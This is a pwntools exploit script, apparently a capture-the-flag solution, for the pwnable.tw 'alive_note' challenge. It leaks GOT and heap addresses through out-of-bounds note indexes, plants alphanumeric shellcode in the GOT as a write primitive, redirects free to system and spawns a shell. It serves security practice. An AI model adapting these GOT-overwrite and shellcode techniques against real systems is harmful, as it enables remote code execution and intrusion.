# this is definitely not the intended solution
from pwn import *
context.update(os='linux', arch="i386")

#p = process(["./alive_note"])
p = remote("chall.pwnable.tw", 10300)

# methods to interact with the program
def read_note(index):
    p.sendafter("Your choice :", "2\n")
    p.sendafter("Index :", "%d\n" % index)
    p.readuntil("Name : ")
    return u32(p.read(4))

def write_note(index, note):
    p.sendafter("Your choice :", "1\n")
    p.sendafter("Index :", "%d\n" % index)
    p.sendafter("Name :", "%s\n" % note)

def delete_note(index):
    p.sendafter("Your choice :", "3\n")
    p.sendafter("Index :", "%d\n" % index)
    
puts_addr = read_note(-782) # read puts got to calculate other addrs

#system_addr = puts_addr - 0x24f00
system_addr = puts_addr - 0x24800 # get relative system addr
log.info("SYSTEM: %08x", system_addr)

#free_addr = puts_addr + 0x117d0
free_addr = puts_addr + 0x11470 # get relative free addr

write_note(0, "AAAABBBB") # write temp note to get addr on heap
note_addr = read_note(-482) # read that addr from a ref to &note
log.info("NOTE: %08x", note_addr)
delete_note(0) # delete it so the next note will be at the same addr

sc = asm('''
push eax;
push eax;
popad;
popad;          // pop values from stack into the right regs
xor [edi], esi; // use popped values for write-what-where
inc edi;        // "nops"
inc edi;        // "nops"
''') # weird shellcode ('PPaa17GG') sets up stack for write primitive

write_note(-23, sc) # write it into the GOT for <exit>

new_sc = asm('''
push ecx; // ecx contains a ret addr in main
ret;      // ret to prevent SIGSEG
''') # first write will use ret addr in ecx to ret to main

newnote = p32(note_addr + 8) + new_sc.ljust(4,"\x90")
write_note(0, newnote) # write described above

newnote = p32(0x0804a014) + p32(system_addr ^ free_addr)
write_note(0, newnote) # write <system> addr into the GOT for <free>
#gdb.attach(p, "b *0x80484e0\nc\n")

write_note(1, "sh") # write sh to use in call to system
delete_note(1) # call free("sh") which is now system("sh")
p.interactive()